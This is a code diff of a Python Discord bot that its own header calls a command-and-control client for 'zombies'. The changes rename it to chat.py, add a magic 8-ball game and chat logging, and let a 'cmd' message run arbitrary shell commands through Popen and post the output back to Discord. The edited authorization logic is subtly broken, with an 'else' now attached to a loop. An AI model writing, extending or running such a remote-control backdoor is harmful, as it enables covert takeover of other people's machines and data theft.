@@ -1,21 +1,17 @@
 '''
-Application: c2dis.py
+Application: chat.py
 Author: Andrew Eng
 Date: 2020-11-10
 
 Description:
 This is a c2 client that communicates via discord.  Enter in your bot token and authorized user id to command and control your zombies.
 
-Usage: python3 c2dis.py
+Usage: python3 chat.py
 
 You can talk directly to the bot or through public chat.  If you are talking on the public chat; the command execution codes are:
-
 @bot_name cmd <command to execute>
-
 If you DM the bot directly, you can say "ip" to get IP address information
-
 CTRL + C to exit the discord connection
-
 Command executions to the bot is logged in chat.log
 
 '''
@@ -24,6 +20,8 @@ import discord
 import netifaces
 from subprocess import Popen, PIPE
 import datetime as dt
+import random
+import time
 
 # Make sure you create a credentials.txt file in your home directory
 keys = []
@@ -34,7 +32,13 @@ with open('credentials.txt','r') as credentials:
 credentials.close()
 
 token = keys[0].strip()
-authorized_user = keys[1].strip()
+authorized_id = keys[1].strip()
+authorized_user = keys[2].strip()
+
+# 8 Ball function just to spice up this command channel
+def magicEight():
+    eightBall = ['It is certain','Outlook good','You may rely on it','Ask again later','Concentrate and ask again','Reply hazy, try again','My reply is no','My sources say no']
+    return random.choice(eightBall)
 
 # Get IP address info
 def getIP():
@@ -54,20 +58,30 @@ client = discord.Client()
 @client.event
 async def on_ready():
     print('Logged into C2 Server')
-    print('Username: ', end= '')
-    print(client.user.name)
-    print('Userid: ',end = '')
-    print(client.user.id)
-    print(f'Bot Token: {token}')
-    print(f'Authorized User: {authorized_user}')
-    print('CTRL + C to exit')
+    print('CTRL + C to exit\n')
+
+@client.event
+async def on_member_join(member):
+    await member.create_dm()
+    await member.dm_channel.send(f'Hey {member.name}, do you have the right place?')
+
 @client.event
 async def on_message(message):
+    
+    with open('chat.log','a') as chatlog:
+        chatlog.write(f'{dt.datetime.now()}, {message.author.name}, {message.content}\n')
+    chatlog.close()
+
+    print(f'{message.content}\n')
 
     if message.author.id == client.user.id:
         return
 
     if message.content.startswith('ip'):
+        with open('command.log','a') as log:
+            log.write(f'{dt.datetime.now()}, [public], {message.author.name}, {message.content}\n')
+        log.close()
+
         myIP = getIP()
         count = 0
         while count < len(myIP):
@@ -75,29 +89,47 @@ async def on_message(message):
             count +=1
         await message.channel.send('.... waiting for next commands')
 
-    if message.content.startswith(authorized_user):
+# Monitor the chatroom for keyword "cmd" and execute commands
+    if message.content.startswith('cmd'):
+        if message.author.name == authorized_user:
+            msg = message.content.split(' ')
+            with open('command_dm.log','a') as log:
+                log.write(f'{dt.datetime.now()}, [public], {message.author.name}, {message.content}\n')
+            log.close()
+            cmd = ' '.join(msg[1:len(msg)])
+            stdout = Popen(cmd, shell=True, stdout=PIPE).stdout
+            output = stdout.read().decode('utf-8').split('\n')
+            for eachline in output:
+                if bool(eachline) == True:
+                     await message.channel.send(eachline)
+
+# Lets play magic eightball
+    if message.content.startswith('8ball') or message.content.startswith('shake'):
+        await message.channel.send(f'Ask your question!')
+        time.sleep(5)
+        await message.channel.send(f'Eightball says:         {magicEight()}')
+
+    if message.content.startswith('help'):
+        await message.channel.send('... try sending me a message like "@bot cmd <command>"')
+
+    if message.content.startswith(authorized_id):
         # split the messages and create a list
         msg = message.content.split(' ')
 
         # Create chat log
-        with open('chat.log','a') as log:
-            log.write(f'{dt.datetime.now()}, [public], {message.content}\n')
+        with open('command_dm.log','a') as log:
+            log.write(f'{dt.datetime.now()}, [dm], {message.content}\n')
         log.close()
         
         cmd = ' '.join(msg[2:len(msg)])
 
         # Second validation; just making sure the right person is sending commands 
-        if msg[0] == authorized_user:
-            stdout = Popen(cmd, shell=True, stdout=PIPE).stdout
-            output = stdout.read().decode('utf-8').split('\n')
-            for eachline in output:
-                if bool(eachline) == True:
-                    await message.channel.send(eachline)
+        stdout = Popen(cmd, shell=True, stdout=PIPE).stdout
+        output = stdout.read().decode('utf-8').split('\n')
+        for eachline in output:
+            if bool(eachline) == True:
+                await message.channel.send(eachline)
         else:
             await message.channel.send('... Sorry, you are not authorized to send commands')
 
-    else:
-        await message.channel.send('... I think you are talking to the wrong bot.')
-
 client.run(token)
-
